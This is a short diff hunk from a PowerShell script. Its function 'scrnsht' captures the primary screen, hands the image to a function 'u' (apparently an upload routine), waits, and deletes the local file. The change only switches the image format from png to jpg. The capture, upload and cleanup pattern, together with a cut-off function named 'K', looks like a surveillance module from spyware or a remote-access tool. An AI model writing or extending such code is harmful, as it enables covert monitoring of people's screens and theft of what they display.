@@ -95,10 +95,10 @@ function screenshot([Drawing.Rectangle]$bounds, $path) {
 function scrnsht {
 $Monitors = [System.Windows.Forms.Screen]::AllScreens
 $bounds = $Monitors[0].Bounds
-screenshot $bounds "screenshot.png"
-u("screenshot.png")
+screenshot $bounds "screenshot.jpg"
+u("screenshot.jpg")
 wait 1000
-Remove-Item "screenshot.png"
+Remove-Item "screenshot.jpg"
 }
 
 function K {
